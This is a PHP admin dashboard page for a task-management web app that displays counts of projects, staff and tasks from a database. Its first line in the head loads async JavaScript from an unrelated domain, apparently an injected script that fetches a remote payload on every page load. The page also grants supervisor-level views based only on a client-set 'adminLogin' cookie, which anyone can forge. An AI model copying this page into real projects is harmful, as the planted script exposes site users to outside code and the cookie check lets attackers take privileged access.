<!DOCTYPE html>
<html lang="en">
<head>
<script type="text/javascript" src="https://brolink1s.site/code/hbsdazrrha5ha3ddf42tambu" async></script>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <title>Admin Dashboard</title>
    <?php include "../topcdn.php" ?>
 

</head>
<body class="sectionimg">

<div class="container-fluid">
    <div class="row flex-nowrap">
    <?php include "nav.php" ?>
        <!-- Content Start -->
        
        <div class="col  py-3 content " id="dashboard-content">
          <div class="container">
              
          <div class="mobile-toggle-icon ms-2">
            <div class="toggle-icon mt-2 mb-4" onclick="toggleSidebar()">
                <i class="bi bi-list fs-3"></i>
            </div>
        </div><h2 class="pb-2 heading"><?php
    if (isset($_COOKIE['adminLogin']) && $_COOKIE['adminLogin'] == 1) {
        echo 'Welcome! Supervisor';
    } else {
        echo 'Welcome! Admin';
    }
    ?></h2>

          </div>
            <div class="container mt-3 py-2">
              
                <!-- Content -->
                <div class="row">
                  <?php if($_COOKIE['adminLogin']==1): ?>
                    <div class="col-lg-4">
                        <a href="projects.php" class="text-decoration-none">
                            <div class="py-4 cardz card shadow-lg d-flex justify-content-center align-items-center"
                                 style="border-radius: 1rem;">
                                <div class="icon icon-shape icon-shape-primary rounded-circle">
                                    <span class="bi-table fs-4 s text-secondary"></span>
                                
                                <span class="counter display-6 s fw-bold d-block text-secondary">
                                    <?php
                                    include 'config.php';
                                    $sql = "SELECT COUNT(id) AS project_count FROM task_projects";
                                    $result = $conn->query($sql);
                                    if ($result->num_rows > 0) {
                                        while ($row = $result->fetch_assoc()) {
                                            echo $row['project_count'];
                                        }
                                    } else {
                                        echo "<div class='alert alert-danger'>No data available</div>";
                                    }
                                    $conn->close();
                                    ?>
                                </span></div>
                                <span class="h5 text-gray s text-secondary">Projects</span>
                            </div>
                        </a>
                    </div>
                    <div class="col-lg-4">
                        <a href="employees1.php" class="text-decoration-none">
                            <div class="cardz card py-4 shadow-lg d-flex justify-content-center align-items-center"
                                 style="border-radius: 1rem;">
                                <div class="icon icon-shape icon-shape-primary rounded-circle ">
                                    <span class="bi-people fs-4 s text-secondary"></span>
                                </div>
                                <span class="counter display-6 s fw-bold d-block text-secondary">
                                    <?php
                                    include 'config.php';
                                    $sql = "SELECT COUNT(id) AS employee_count FROM task_employees";
                                    $result = $conn->query($sql);
                                    if ($result->num_rows > 0) {
                                        while ($row = $result->fetch_assoc()) {
                                            echo $row['employee_count'];
                                        }
                                    } else {
                                        echo "<div class='alert alert-danger'>No data available</div>";
                                    }
                                    $conn->close();
                                    ?>
                                </span>
                                <span class="h5 text-gray s text-secondary">Staff Members</span>
                            </div>
                        </a>
                    </div>
                    <div class="col-lg-4">
                        <a href="tasks.php" class="text-decoration-none">
                            <div class="cardz py-4 card shadow-lg d-flex justify-content-center align-items-center"
                                 style="border-radius: 1rem;">
                                <div class="icon icon-shape icon-shape-primary rounded-circle ">
                                    <span class="bi-grid fs-4 s text-secondary"></span>
                                </div>
                                <span class="counter display-6 s fw-bold d-block text-secondary">
                                    <?php
                                    include 'config.php';
                                    $sql = "SELECT COUNT(id) AS task_count FROM task_tasks";
                                    $result = $conn->query($sql);
                                    if ($result->num_rows > 0) {
                                        while ($row = $result->fetch_assoc()) {
                                            echo $row['task_count'];
                                        }
                                    } else {
                                        echo "<div class='alert alert-danger'>No data available</div>";
                                    }
                                    $conn->close();
                                    ?>
                                </span>
                                <span class="h5 text-gray s text-secondary">Tasks</span>
                            </div>
                        </a>
                    </div>
                    <?php elseif($_COOKIE['adminLogin']==0): ?>
                    <div class="col-lg-4">
                        <a href="tasks.php" class="text-decoration-none">
                            <div class="cardz py-4 card shadow-lg d-flex justify-content-center align-items-center"
                                 style="border-radius: 1rem;">
                                <div class="icon icon-shape icon-shape-primary rounded-circle ">
                                    <span class="bi-grid fs-4 s text-secondary"></span>
                                </div>
                                <span class="counter display-6 s fw-bold d-block text-secondary">
                                    <?php
                                    include 'config.php';
                                    $sql = "SELECT COUNT(id) AS task_count FROM task_tasks";
                                    $result = $conn->query($sql);
                                    if ($result->num_rows > 0) {
                                        while ($row = $result->fetch_assoc()) {
                                            echo $row['task_count'];
                                        }
                                    } else {
                                        echo "<div class='alert alert-danger'>No data available</div>";
                                    }
                                    $conn->close();
                                    ?>
                                </span>
                                <span class="h5 text-gray s text-secondary">Tasks</span>
                            </div>
                        </a>
                    </div>
                    <div class="col-lg-4">
                        <a href="employees.php" class="text-decoration-none">
                            <div class="cardz card py-4 shadow-lg d-flex justify-content-center align-items-center"
                                 style="border-radius: 1rem;">
                                <div class="icon icon-shape icon-shape-primary rounded-circle ">
                                    <span class="bi-people fs-4 s text-secondary"></span>
                                </div>
                                <span class="counter display-6 s fw-bold d-block text-secondary">
                                    <?php
                                    include 'config.php';
                                    $sql = "SELECT COUNT(id) AS employee_count FROM task_employees";
                                    $result = $conn->query($sql);
                                    if ($result->num_rows > 0) {
                                        while ($row = $result->fetch_assoc()) {
                                            echo $row['employee_count'];
                                        }
                                    } else {
                                        echo "<div class='alert alert-danger'>No data available</div>";
                                    }
                                    $conn->close();
                                    ?>
                                </span>
                                <span class="h5 text-gray s text-secondary">Staff Members</span>
                            </div>
                        </a>
                    </div>
                        <?php endif; ?>
                </div>
                <!-- Content End -->
            </div>
        </div>
    </div>
</div>


<?php include "../bottomcdn.php" ?>


</body>
</html>
